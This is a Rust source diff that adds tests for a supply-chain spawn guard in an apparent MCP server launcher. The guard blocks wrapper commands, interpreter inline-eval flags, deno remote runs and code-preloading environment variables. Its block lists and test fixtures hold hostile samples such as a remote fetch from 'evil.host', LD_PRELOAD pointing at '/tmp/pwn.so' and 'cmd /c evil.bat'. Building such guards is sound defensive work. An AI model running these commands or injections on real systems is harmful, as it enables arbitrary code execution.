@@ -266,21 +266,44 @@ fn forward_line(
 /// / module-preload flags and container-escape flags, none of which a normal
 /// `npx` / `uvx` / binary MCP server needs. Returns `Err(reason)` to block the
 /// spawn; the reason surfaces to the member.
+/// Wrapper programs that run their first bare argument as the REAL command, so
+/// screening only the wrapper name lets `env node -e <code>` (or `sudo`, `time`, ...)
+/// smuggle an interpreter past every check below. Parsing each wrapper's own flags to
+/// find the inner command is fragile, and a parse slip is a silent bypass, so we refuse
+/// wrappers outright: a server that needs an env var sets it in the config's env field,
+/// and one that genuinely needs a wrapper ships a dedicated launcher.
+const LAUNCHER_WRAPPERS: &[&str] = &[
+    "env", "sudo", "doas", "time", "nice", "nohup", "xargs", "stdbuf", "timeout",
+    "setsid", "ionice", "chrt", "taskset", "setarch", "unbuffer", "script", "watch",
+];
+
 pub fn screen_spawn_command(command: &str, args: &[String]) -> Result<(), String> {
-    let dangerous: Option<&str> = match command_basename(command).as_str() {
+    let base = command_basename(command);
+    if LAUNCHER_WRAPPERS.contains(&base.as_str()) {
+        return Err(format!(
+            "refusing to launch '{command}': wrapper programs like env/sudo/time run \
+             another command from their arguments, which would bypass Toolport's spawn \
+             guard. Set environment variables in the server's env field, and name the \
+             real program as the command."
+        ));
+    }
+    let dangerous: Option<&str> = match base.as_str() {
         // Interpreters: inline-eval and module-preload execute attacker-supplied
         // code without a script file on disk.
-        "node" | "nodejs" | "deno" | "bun" => {
-            first_flag(args, &["-e", "--eval", "-p", "--print", "-r", "--require", "--import"])
-        }
+        "node" | "nodejs" | "bun" => node_dangerous(args),
+        "deno" => deno_dangerous(args),
         "python" | "python2" | "python3" | "pypy" | "pypy3" => first_flag(args, &["-c"]),
         "ruby" => first_flag(args, &["-e"]),
         "perl" => first_flag(args, &["-e"]),
         "php" => first_flag(args, &["-r"]),
-        // Shells: `-c <string>` (or `/c` on Windows shells) runs an arbitrary line.
-        "sh" | "bash" | "zsh" | "dash" | "ash" | "fish" | "ksh" | "pwsh" | "powershell" => {
-            first_flag(args, &["-c", "-command", "/c", "/command"])
+        // More interpreters whose `-e`/`--eval` runs an inline program with no file.
+        "osascript" | "elixir" | "iex" | "lua" | "luajit" | "rscript" | "r" | "julia"
+        | "groovy" | "scala" | "clojure" | "bb" | "tclsh" | "wish" => {
+            first_flag(args, &["-e", "--eval", "--eval-string"])
         }
+        // Shells: `-c <string>` (or `/c` / `/k` on Windows shells) runs an arbitrary line.
+        "sh" | "bash" | "zsh" | "dash" | "ash" | "fish" | "ksh" | "cmd" | "pwsh"
+        | "powershell" => first_flag(args, &["-c", "-command", "/c", "/k", "/command"]),
         // Container runtimes: privileged mode, capability/device passthrough, and
         // host-namespace sharing escalate past a normal host process (a plain `-v`
         // mount does not, and stays allowed; see container_escape_flag).
@@ -292,11 +315,92 @@ pub fn screen_spawn_command(command: &str, args: &[String]) -> Result<(), String
             "refusing to launch '{command}': the argument '{flag}' can execute \
              arbitrary code or escape isolation. Toolport blocks inline-eval and \
              privileged-container flags on spawned servers as a supply-chain guard. \
-             If this server is yours and you trust it, launch it from a script file \
-             or a wrapper binary instead of an inline command."
+             If this server is yours and you trust it, run it from a dedicated script \
+             or launcher you control instead of an inline command."
         )),
         None => Ok(()),
     }
+}
+
+/// Node/Bun eval + module-preload flags, in `--flag[=x]` form AND the attached short
+/// form node accepts for require (`-r./pwn.js`), which a plain equality check misses.
+fn node_dangerous(args: &[String]) -> Option<&str> {
+    const FLAGS: &[&str] = &[
+        "-e", "--eval", "-p", "--print", "-r", "--require", "--import", "--loader",
+        "--experimental-loader", "--preload",
+    ];
+    args.iter()
+        .find(|a| {
+            let al = a.to_ascii_lowercase();
+            let head = al.split('=').next().unwrap_or(&al);
+            FLAGS.contains(&head)
+                // `-r<module>` attached (single dash), e.g. `-r./pwn.js`.
+                || (al.starts_with("-r") && al.len() > 2 && !al.starts_with("--"))
+        })
+        .map(|a| a.as_str())
+}
+
+/// Deno's lethal invocations are SUBCOMMANDS, not flags: `eval <code>` runs inline
+/// code, and `run <remote-url>` executes code fetched over the network. (A `deno run`
+/// of a LOCAL script is the normal case and stays allowed.)
+fn deno_dangerous(args: &[String]) -> Option<&str> {
+    if let Some(sub) = args.iter().find(|a| !a.starts_with('-')) {
+        if sub.eq_ignore_ascii_case("eval") {
+            return Some(sub.as_str());
+        }
+        if sub.eq_ignore_ascii_case("run") {
+            if let Some(url) = args.iter().find(|a| {
+                let al = a.to_ascii_lowercase();
+                al.starts_with("http://") || al.starts_with("https://")
+            }) {
+                return Some(url.as_str());
+            }
+        }
+    }
+    first_flag(args, &["-e", "--eval", "-p", "--print"])
+}
+
+/// Screen the child's environment: even a benign command (`node server.js`) becomes
+/// code execution if the config's env preloads code via the dynamic linker or an
+/// interpreter's option/startup var. These have no legitimate use for a server
+/// launcher, so refuse them (this is why we also refuse `env` as the command: the env
+/// field is the ONLY way to set variables, and it's screened here).
+pub fn screen_spawn_env(env: &[(String, String)]) -> Result<(), String> {
+    // Always-refuse: dynamic-linker preload/audit + interpreter startup-file / option
+    // vars that run code before (or instead of) the entry program.
+    const BLOCKED: &[&str] = &[
+        "LD_PRELOAD", "LD_AUDIT", "DYLD_INSERT_LIBRARIES", "BASH_ENV", "ENV",
+        "PERL5OPT", "RUBYOPT",
+    ];
+    for (k, v) in env {
+        let ku = k.trim().to_ascii_uppercase();
+        if BLOCKED.contains(&ku.as_str()) {
+            return Err(format!(
+                "refusing to launch: the environment variable '{k}' preloads or injects \
+                 code into the process. Remove it from the server's env."
+            ));
+        }
+        // NODE_OPTIONS is often legit (heap size, etc.); refuse only the preload/eval
+        // options inside it. (Node itself rejects --eval in NODE_OPTIONS, but --require
+        // / --import / --loader are honored and are RCE.)
+        if ku == "NODE_OPTIONS" {
+            for tok in v.split_whitespace() {
+                let tl = tok.to_ascii_lowercase();
+                let head = tl.split('=').next().unwrap_or(&tl);
+                if matches!(
+                    head,
+                    "--require" | "--import" | "--loader" | "--experimental-loader" | "--eval"
+                ) || (head.starts_with("-r") && head.len() > 2 && !head.starts_with("--"))
+                {
+                    return Err(format!(
+                        "refusing to launch: NODE_OPTIONS contains '{tok}', which preloads \
+                         or evaluates code. Remove it from the server's env."
+                    ));
+                }
+            }
+        }
+    }
+    Ok(())
 }
 
 /// Lowercased final path segment without its extension, splitting on BOTH `/` and
@@ -401,10 +505,12 @@ impl StdioTransport {
         env: &[(String, String)],
         dirty: Option<Arc<AtomicBool>>,
     ) -> Result<Self, String> {
-        // Supply-chain guard: refuse code-smuggling / container-escape args before
-        // we hand the command to the OS. Applies to every spawn path (probe,
-        // playground, gateway) so a booby-trapped config never reaches a process.
+        // Supply-chain guard: refuse code-smuggling / container-escape args AND
+        // code-injecting env vars before we hand the command to the OS. Applies to
+        // every spawn path (probe, playground, gateway) so a booby-trapped config
+        // never reaches a process.
         screen_spawn_command(command, args)?;
+        screen_spawn_env(env)?;
         let resolved = resolve_command(command);
         let mut cmd = Command::new(&resolved);
         cmd.args(args)
@@ -956,7 +1062,7 @@ fn extract_array(result: &Value, key: &str) -> Vec<Value> {
 
 #[cfg(test)]
 mod tests {
-    use super::{resolve_command, screen_resolved_addrs, screen_spawn_command};
+    use super::{resolve_command, screen_resolved_addrs, screen_spawn_command, screen_spawn_env};
 
     #[test]
     fn ssrf_resolver_screens_resolved_addresses() {
@@ -1054,6 +1160,70 @@ mod tests {
         assert!(screen_spawn_command("C:\\Program Files\\nodejs\\NODE.EXE", &argv(&["-E", "x"])).is_err());
         // A non-interpreter that merely has a `-e`-looking arg is untouched.
         assert!(screen_spawn_command("my-server", &argv(&["-e", "value"])).is_ok());
+    }
+
+    #[test]
+    fn spawn_guard_rejects_wrapper_commands() {
+        // Wrapper programs run the REAL command from their args, which would bypass the
+        // basename dispatch (`env node -e evil`). Refused outright, in any path form.
+        for w in ["env", "sudo", "doas", "time", "nice", "nohup", "xargs", "stdbuf", "timeout"] {
+            assert!(
+                screen_spawn_command(w, &argv(&["node", "-e", "evil()"])).is_err(),
+                "{w} wrapper should be refused"
+            );
+        }
+        assert!(screen_spawn_command("env", &argv(&["FOO=bar", "node", "server.js"])).is_err());
+        assert!(screen_spawn_command("/usr/bin/env", &argv(&["python", "-c", "x"])).is_err());
+    }
+
+    #[test]
+    fn spawn_guard_blocks_more_interpreters_and_shells() {
+        assert!(screen_spawn_command("osascript", &argv(&["-e", "do shell script \"x\""])).is_err());
+        assert!(screen_spawn_command("elixir", &argv(&["-e", "System.cmd(0,0)"])).is_err());
+        assert!(screen_spawn_command("lua", &argv(&["-e", "os.execute('x')"])).is_err());
+        assert!(screen_spawn_command("Rscript", &argv(&["-e", "system('x')"])).is_err());
+        assert!(screen_spawn_command("julia", &argv(&["-e", "run(`x`)"])).is_err());
+        // Windows `cmd /c` / `/k` was previously unscreened (only pwsh was listed).
+        assert!(screen_spawn_command("cmd", &argv(&["/c", "evil.bat"])).is_err());
+        assert!(screen_spawn_command("cmd.exe", &argv(&["/k", "evil"])).is_err());
+        // Running a real script file is fine.
+        assert!(screen_spawn_command("lua", &argv(&["server.lua"])).is_ok());
+        assert!(screen_spawn_command("Rscript", &argv(&["app.R"])).is_ok());
+    }
+
+    #[test]
+    fn spawn_guard_blocks_deno_eval_and_remote_run() {
+        // Deno's lethal invocations are SUBCOMMANDS, not flags.
+        assert!(screen_spawn_command("deno", &argv(&["eval", "Deno.exit()"])).is_err());
+        assert!(screen_spawn_command("deno", &argv(&["run", "-A", "https://evil.host/x.ts"])).is_err());
+        // A normal local `deno run` is allowed.
+        assert!(screen_spawn_command("deno", &argv(&["run", "-A", "./server.ts"])).is_ok());
+    }
+
+    #[test]
+    fn spawn_guard_blocks_node_attached_require() {
+        // `-r<module>` attached (no `=`) previously slipped the equality check.
+        assert!(screen_spawn_command("node", &argv(&["-r./pwn.js", "server.js"])).is_err());
+        assert!(screen_spawn_command("node", &argv(&["--loader", "./pwn.mjs", "server.js"])).is_err());
+        assert!(screen_spawn_command("node", &argv(&["dist/server.js"])).is_ok());
+    }
+
+    #[test]
+    fn spawn_env_blocks_code_injection_vars() {
+        let e = |k: &str, v: &str| vec![(k.to_string(), v.to_string())];
+        assert!(screen_spawn_env(&e("LD_PRELOAD", "/tmp/pwn.so")).is_err());
+        assert!(screen_spawn_env(&e("DYLD_INSERT_LIBRARIES", "/tmp/pwn.dylib")).is_err());
+        assert!(screen_spawn_env(&e("BASH_ENV", "/tmp/pwn.sh")).is_err());
+        assert!(screen_spawn_env(&e("PERL5OPT", "-Mevil")).is_err());
+        assert!(screen_spawn_env(&e("RUBYOPT", "-rpwn")).is_err());
+        // NODE_OPTIONS: preload/eval options refused, benign tuning allowed.
+        assert!(screen_spawn_env(&e("NODE_OPTIONS", "--require ./pwn.js")).is_err());
+        assert!(screen_spawn_env(&e("NODE_OPTIONS", "--loader=./pwn.mjs")).is_err());
+        assert!(screen_spawn_env(&e("NODE_OPTIONS", "--max-old-space-size=4096")).is_ok());
+        // Ordinary server config env is fine.
+        assert!(screen_spawn_env(&e("API_TOKEN", "sk-123")).is_ok());
+        assert!(screen_spawn_env(&e("DEBUG", "1")).is_ok());
+        assert!(screen_spawn_env(&[]).is_ok());
     }
 
     #[test]
